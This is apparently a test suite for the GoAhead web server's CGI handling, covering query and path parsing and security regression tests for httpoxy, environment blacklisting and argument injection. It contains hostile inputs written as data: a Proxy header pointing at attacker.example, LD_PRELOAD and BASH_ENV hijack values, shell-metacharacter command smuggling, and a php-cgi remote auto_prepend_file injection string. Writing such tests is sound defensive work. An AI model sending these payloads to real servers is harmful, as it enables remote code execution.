/*
    cgi.tst - CGI tests
 */

import { Http, Config, Path } from '@embedthis/ejscript'
import { tget, thas, tskip, ttrue } from '@embedthis/testme'

const HTTP = tget('TM_HTTP') || "127.0.0.1:8080"
let http: Http = new Http

if (thas('ME_GOAHEAD_CGI')) {
    /* Suport routines */

    function contains(pat: string): void {
        ttrue(http.response.contains(pat))
    }

    function keyword(pat: string): string {
        pat.replace(/\//, "\\/").replace(/\[/, "\\[")
        let reg = RegExp(".*" + pat + "=([^<]*).*", "s")
        return http.response.replace(reg, "$1")
    }

    function match(key: string, value: string): void {
        if (keyword(key) != value) {
            console.log(http.response)
            console.log("\nKey \"" + key + "\"")
            console.log("Expected: " + value)
            // console.log("Actual  : " + keyword(value))
        }
        ttrue(keyword(key) == value)
    }


    /* Tests */

    async function forms() {
        //  Test various forms to invoke cgi programs
        http.get(HTTP + "/cgi-bin/cgitest")
        await http.wait()
        ttrue(http.status == 200)
        contains("cgitest: Output")
        http.close()

        if (Config.OS == "windows") {
            http.get(HTTP + "/cgi-bin/cgitest.exe")
            await http.wait()
            ttrue(http.status == 200)
            contains("cgitest: Output")
            http.close()
        }
    }

    async function extraPath() {
        http.get(HTTP + "/cgi-bin/cgitest")
        await http.wait()
        ttrue(http.status == 200)
        match("PATH_INFO", "")
        match("PATH_TRANSLATED", "")
        http.close()

        http.get(HTTP + "/cgi-bin/cgitest/extra/path")
        await http.wait()
        match("PATH_INFO", "/extra/path")
        let scriptFilename = keyword("SCRIPT_FILENAME")
        let path = new Path(scriptFilename).dirname.join("extra/path")
        let translated = new Path(keyword("PATH_TRANSLATED"))
        //  Compare path strings with separators normalized. On Windows, goahead emits PATH_TRANSLATED
        //  with mixed separators (getcwd is "\\" but the URL-derived suffix is "/"); Path.dirname.join
        //  normalizes to "\\". Collapse both to "/" so the comparison tests logical equality.
        ttrue(path.toString().replace(/\\/g, "/") == translated.toString().replace(/\\/g, "/"))
        http.close()
    }

    async function query() {
        http.get(HTTP + "/cgi-bin/cgitest/extra/path?a=b&c=d&e=f")
        await http.wait()
        match("SCRIPT_NAME", "/cgi-bin/cgitest")
        match("PATH_INFO", "/extra/path")
        contains("QVAR a=b")
        contains("QVAR c=d")
        http.close()

        http.get(HTTP + "/cgi-bin/cgitest?a+b+c")
        await http.wait()
        match("QUERY_STRING", "a+b+c")
        contains("QVAR a b c")
        http.close()

        //
        //  Query string vars should not be turned into variables for GETs
        //  Extra path only supported for cgi programs with extensions.
        //
        http.get(HTTP + "/cgi-bin/cgitest/extra/path?var1=a+a&var2=b%20b&var3=c")
        await http.wait()
        match("SCRIPT_NAME", "/cgi-bin/cgitest")
        match("QUERY_STRING", "var1=a+a&var2=b%20b&var3=c")
        match("QVAR var1", "a a")
        match("QVAR var2", "b b")
        match("QVAR var3", "c")
        http.close()

        //
        //  Post data should be turned into variables
        //
        http.form(HTTP + "/cgi-bin/cgitest/extra/path?var1=a+a&var2=b%20b&var3=c",
            { name: "Peter", address: "777 Mulberry Lane" })
        await http.wait()
        match("QUERY_STRING", "var1=a+a&var2=b%20b&var3=c")
        match("QVAR var1", "a a")
        match("QVAR var2", "b b")
        match("QVAR var3", "c")
        match("PVAR name", "Peter")
        match("PVAR address", "777 Mulberry Lane")
        http.close()
    }

    async function encoding() {
        //  Modern HTTP clients (curl, Bun) pre-normalize URL dot-segments before transmit,
        //  so "/extra long/a/../path/a/.." arrives at the server as "/extra long/path/"
        //  with a trailing slash. Expectations below reflect what actually reaches the server.
        http.get(HTTP + "/cgi-bin/cgitest/extra%20long/a/../path/a/..?var%201=value%201")
        await http.wait()
        match("QUERY_STRING", "var%201=value%201")
        match("SCRIPT_NAME", "/cgi-bin/cgitest")
        match("QVAR var 1", "value 1")
        match("PATH_INFO", "/extra long/path/")

        let scriptFilename = keyword("SCRIPT_FILENAME")
        let path = new Path(scriptFilename).dirname.join("extra long/path/")
        let translated = new Path(keyword("PATH_TRANSLATED"))
        //  Normalize separators for cross-platform comparison; see extraPath() for rationale.
        ttrue(path.toString().replace(/\\/g, "/") == translated.toString().replace(/\\/g, "/"))
        http.close()
    }

    async function status() {
        let http = new Http
        http.setHeader("SWITCHES", "-s%20711")
        http.get(HTTP + "/cgi-bin/cgitest?pat=111")
        await http.wait()
        ttrue(http.status == 711)
        http.close()
    }

    async function location() {
        let http = new Http
        http.setHeader("SWITCHES", "-l%20/index.html")
        http.followRedirects = false
        http.get(HTTP + "/cgi-bin/cgitest")
        await http.wait()
        ttrue(http.status == 302)
        http.close()
    }

    async function quoting() {
        http.get(HTTP + "/cgi-bin/cgitest?a+b+c")
        await http.wait()
        match("QUERY_STRING", "a+b+c")
        match("QVAR a b c", "")
        http.close()

        http.get(HTTP + "/cgi-bin/cgitest?a=1&b=2&c=3")
        await http.wait()
        match("QUERY_STRING", "a=1&b=2&c=3")
        match("QVAR a", "1")
        match("QVAR b", "2")
        match("QVAR c", "3")
        http.close()

        http.get(HTTP + "/cgi-bin/cgitest?a%20a=1%201+b%20b=2%202")
        await http.wait()
        match("QUERY_STRING", "a%20a=1%201+b%20b=2%202")
        match("QVAR a a", "1 1 b b=2 2")
        http.close()

        http.get(HTTP + "/cgi-bin/cgitest?a%20a=1%201&b%20b=2%202")
        await http.wait()
        match("QUERY_STRING", "a%20a=1%201&b%20b=2%202")
        match("QVAR a a", "1 1")
        match("QVAR b b", "2 2")
        http.close()
    }

    async function post() {
        //  Simple post
        http.post(HTTP + '/cgi-bin/cgitest', 'Some data')
        await http.wait()
        ttrue(http.status == 200)
        match('CONTENT_LENGTH', '9')
        http.close()

        //  Simple form
        http.form(HTTP + '/cgi-bin/cgitest', {name: 'John', address: '700 Park Ave'})
        await http.wait()
        ttrue(http.status == 200)
        match('PVAR name', 'John')
        match('PVAR address', '700 Park Ave')
        http.close()
    }

    /*
        Test httpoxy mitigation (CVE-2016-5385 family) and restored blacklist behaviour.

        The cgitest program prints every env variable in the "All Defined Environment
        Variables" section as <P>NAME=VALUE</P>. We assert absence by checking that the
        literal string "HTTP_PROXY=" does not appear anywhere in the response body.

        Server-side PATH/IFS/BASH_ENV/LD_PRELOAD filtering is exercised via the
        /blacklist-test route registered in src/test.c — see blacklistHandler(),
        which calls websSetVar() for each name then forwards to /cgi-bin/cgitest.

        CRLF injection in the Proxy header value is out of scope: the underlying HTTP
        client normalises or rejects embedded CRLF before the bytes reach the server.
     */
    async function httpoxyAndBlacklist() {
        let h: Http

        //  Proxy header with a value must not produce HTTP_PROXY in the CGI env
        h = new Http
        h.setHeader("Proxy", "http://attacker.example:1337")
        h.get(HTTP + "/cgi-bin/cgitest")
        await h.wait()
        ttrue(h.status == 200)
        ttrue(!h.response.contains("HTTP_PROXY="))
        h.close()

        //  Proxy header with empty value must not produce HTTP_PROXY in the CGI env
        h = new Http
        h.setHeader("Proxy", "")
        h.get(HTTP + "/cgi-bin/cgitest")
        await h.wait()
        ttrue(h.status == 200)
        ttrue(!h.response.contains("HTTP_PROXY="))
        h.close()

        //  Proxy header with a long value must not produce HTTP_PROXY in the CGI env
        //  Use 200 chars — enough to exercise the path without hitting server header limits.
        h = new Http
        h.setHeader("Proxy", "http://attacker.example:1337/" + "A".repeat(200))
        h.get(HTTP + "/cgi-bin/cgitest")
        await h.wait()
        ttrue(h.status == 200)
        ttrue(!h.response.contains("HTTP_PROXY="))
        h.close()

        //  Legitimate HTTP_USER_AGENT must still propagate to the CGI env
        h = new Http
        h.setHeader("User-Agent", "gomock/1.0")
        h.get(HTTP + "/cgi-bin/cgitest")
        await h.wait()
        ttrue(h.status == 200)
        ttrue(h.response.contains("HTTP_USER_AGENT=gomock/1.0"))
        h.close()

        //  Legitimate HTTP_ACCEPT must still propagate to the CGI env
        h = new Http
        h.setHeader("Accept", "text/html")
        h.get(HTTP + "/cgi-bin/cgitest")
        await h.wait()
        ttrue(h.status == 200)
        ttrue(h.response.contains("HTTP_ACCEPT=text/html"))
        h.close()

        //  Query-string vars must be prefixed with CGI_ (ME_GOAHEAD_CGI_VAR_PREFIX) in the CGI env.
        //  POST body data is delivered via stdin and parsed by the CGI program itself, so it does
        //  not appear in the env — only query-string keys go through addFormVars(arg=1).
        h = new Http
        h.get(HTTP + "/cgi-bin/cgitest?name=joe")
        await h.wait()
        ttrue(h.status == 200)
        ttrue(h.response.contains("CGI_name=joe"))
        h.close()

        //  Server-side blacklist: the /blacklist-test handler in src/test.c sets PATH, IFS,
        //  BASH_ENV, LD_PRELOAD, and a non-blacklisted BLACKLIST_SENTINEL via websSetVar(),
        //  then forwards to /cgi-bin/cgitest. The CGI env build must drop the blacklisted
        //  names while the sentinel propagates — proving inBlackList() runs end-to-end.
        h = new Http
        h.get(HTTP + "/blacklist-test/anything")
        await h.wait()
        ttrue(h.status == 200)
        ttrue(!h.response.contains("PATH=/evil:/bin"))
        ttrue(!h.response.contains("IFS=X"))
        ttrue(!h.response.contains("BASH_ENV=/tmp/evil"))
        ttrue(!h.response.contains("LD_PRELOAD=/tmp/evil.so"))
        ttrue(h.response.contains("BLACKLIST_SENTINEL=ok"))
        h.close()
    }

    /*
        Layer 2 of the cgi-windows-arg-injection fix (GOAHEAD-SA-2026-0007).
        ISINDEX argv round-trip end-to-end through the HTTP path.

        On POSIX (macOS / Linux) these tests exercise the unchanged execve
        array path - argument boundaries are preserved by the kernel.
        On Windows they exercise the fixed launchCgi() path - the CRT-correct
        quoting in appendWinArg + buildWinCmdLine reproduces the same argv on
        the receiving CGI program. Identical assertions on both platforms is
        the point: the fix restores cross-platform parity.

        Tests assert on cgitest's "ARG[i]=value" lines emitted by the default
        argv-dump output. The -a switch is implied by cgitest's default mode.
     */
    async function argvRoundTrip() {
        async function send(query: string): Promise<string> {
            let h: Http = new Http
            h.get(HTTP + "/cgi-bin/cgitest?" + query)
            await h.wait()
            ttrue(h.status == 200)
            let body = h.response
            h.close()
            return body
        }

        function hasArg(body: string, n: number, value: string): void {
            //  cgitest emits "<P>ARG[n]=value</P>"; assert on the substring
            let needle = "ARG[" + n + "]=" + value
            if (!body.contains(needle)) {
                console.log("expected " + needle + " in response, got:\n" + body)
            }
            ttrue(body.contains(needle))
        }

        let body: string

        /*
            GOAHEAD-SA-2026-0009 reconciliation: ISINDEX search terms now reach argv only as
            positional operands, preceded by a "--" end-of-options marker (ARG[1]). Benign
            metacharacter tokens still round-trip verbatim, but every ARG[i] index shifts +1
            because the marker occupies ARG[1]. Option-looking (-leading) or decoded-'=' queries
            are rejected with HTTP 400 (see isindexDashReject / isindexEncodedEqReject).

            ARG[0] is the CGI path; ARG[1] is the injected "--"; operands begin at ARG[2].
         */

        /*  Reporter's .bat PoC shape, sent against the .exe (cgitest).
            On any sane runtime the metacharacters must survive as argv
            data, not be interpreted as shell separators.   */
        body = await send("x+%26+whoami+%26+rem")
        hasArg(body, 1, "--")
        hasArg(body, 2, "x")
        hasArg(body, 3, "&")
        hasArg(body, 4, "whoami")
        hasArg(body, 5, "&")
        hasArg(body, 6, "rem")
        ttrue(!body.contains("uid="), "no whoami output in response body")

        /*  Single shell metacharacter as a single argv element each.   */
        for (let mc of ["%26", "%7c", "%3c", "%3e", "%5e", "%25", "%28", "%29"]) {
            body = await send("x+" + mc + "+y")
            hasArg(body, 1, "--")
            hasArg(body, 2, "x")
            hasArg(body, 4, "y")
        }

        /*  Quoted token: "two three" inside a single argv element.   */
        body = await send("one+%22two+three%22+four")
        hasArg(body, 1, "--")
        hasArg(body, 2, "one")
        hasArg(body, 3, "\"two")
        hasArg(body, 4, "three\"")
        hasArg(body, 5, "four")

        /*  Backslash inside a token.   */
        body = await send("path%5Cfile+next")
        hasArg(body, 1, "--")
        hasArg(body, 2, "path\\file")
        hasArg(body, 3, "next")

        /*  Trailing backslashes in a token (the BS-before-closing-quote rule).   */
        body = await send("trail%5C%5C%5C%5C+after")
        hasArg(body, 1, "--")
        hasArg(body, 2, "trail\\\\\\\\")
        hasArg(body, 3, "after")

        /*  Backslash-before-quote (BatBadBut shape).   */
        body = await send("a+%5C%22+b")
        hasArg(body, 1, "--")
        hasArg(body, 2, "a")
        hasArg(body, 3, "\\\"")
        hasArg(body, 4, "b")

        /*  UTF-8 multi-byte content.   */
        body = await send("caf%C3%A9+au+lait")
        hasArg(body, 1, "--")
        hasArg(body, 2, "café")
        hasArg(body, 3, "au")
        hasArg(body, 4, "lait")
    }

    /*
        GOAHEAD-SA-2026-0009 (CWE-88) security tests. Each must fail against the pre-patch
        binary (which delivered -leading and decoded-'=' tokens straight into the CGI argv)
        and pass post-patch (HTTP 400, no argv built).
     */
    async function status400(query: string): Promise<Http> {
        let h: Http = new Http
        h.get(HTTP + "/cgi-bin/cgitest?" + query)
        await h.wait()
        return h
    }

    async function isindexDashReject() {
        //  Reporter's .exe PoC shape (php-cgi-style -d flags) now rejected outright.
        for (let q of ["-d+-r+-c", "-d+allow_url_include%3d1+-d+auto_prepend_file%3dhttp://attacker/x", "-e"]) {
            let h = await status400(q)
            ttrue(h.status == 400)
            //  No option token should have reached argv / been echoed.
            ttrue(!h.response.contains("ARG[1]=-"))
            h.close()
        }
    }

    async function isindexEncodedEqReject() {
        //  Encoded '=' bypasses the raw '=' gate but must be caught post-decode.
        for (let q of ["-d+foo%3Dbar", "foo%3Dbar", "a%3Db"]) {
            let h = await status400(q)
            ttrue(h.status == 400)
            h.close()
        }
    }

    async function isindexPerlMarker() {
        //  Interpreter option-injection shape (?-e+print...). Must be rejected, and the
        //  marker an interpreter would emit must never appear in the response.
        let h = await status400("-e+print%20%22INJECTED_MARKER%22")
        ttrue(h.status == 400)
        ttrue(!h.response.contains("INJECTED_MARKER"))
        h.close()
    }

    /*
        GOAHEAD-SA-2026-0009 regression / success-path tests: benign ISINDEX search terms
        still reach the CGI as positional operands, and the literal-'=' and no-token paths
        are unchanged.
     */
    async function isindexPositional() {
        let h: Http = new Http
        h.get(HTTP + "/cgi-bin/cgitest?red+green+blue")
        await h.wait()
        ttrue(h.status == 200)
        let body = h.response
        ttrue(body.contains("ARG[1]=--"))
        ttrue(body.contains("ARG[2]=red"))
        ttrue(body.contains("ARG[3]=green"))
        ttrue(body.contains("ARG[4]=blue"))
        h.close()
    }

    async function isindexEmpty() {
        //  Bare CGI with no query: argv is [cgiPath] only — no "--" marker injected.
        let h: Http = new Http
        h.get(HTTP + "/cgi-bin/cgitest")
        await h.wait()
        ttrue(h.status == 200)
        ttrue(!h.response.contains("ARG[1]=--"))
        h.close()
    }

    async function isindexKeyvalue() {
        //  Literal '=' query is not ISINDEX: reaches the CGI via QUERY_STRING, no "--" in argv.
        let h: Http = new Http
        h.get(HTTP + "/cgi-bin/cgitest?a=b&c=d")
        await h.wait()
        ttrue(h.status == 200)
        let body = h.response
        ttrue(body.contains("QVAR a=b"))
        ttrue(body.contains("QVAR c=d"))
        ttrue(!body.contains("ARG[1]=--"))
        h.close()
    }

    async function isindexManyTokens() {
        //  Exercise the argpsize doubling with the extra "--" slot: 15 operands + marker.
        let tokens = []
        for (let i = 1; i <= 15; i++) {
            tokens.push("t" + i)
        }
        let h: Http = new Http
        h.get(HTTP + "/cgi-bin/cgitest?" + tokens.join("+"))
        await h.wait()
        ttrue(h.status == 200)
        let body = h.response
        ttrue(body.contains("ARG[1]=--"))
        for (let i = 1; i <= 15; i++) {
            ttrue(body.contains("ARG[" + (i + 1) + "]=t" + i))
        }
        h.close()
    }

    await forms()
    await extraPath()
    await query()
    await encoding()
    await status()
    await location()
    await quoting()
    await post()
    await httpoxyAndBlacklist()
    await argvRoundTrip()
    await isindexDashReject()
    await isindexEncodedEqReject()
    await isindexPerlMarker()
    await isindexPositional()
    await isindexEmpty()
    await isindexKeyvalue()
    await isindexManyTokens()

} else {
    tskip("CGI not enabled")
}
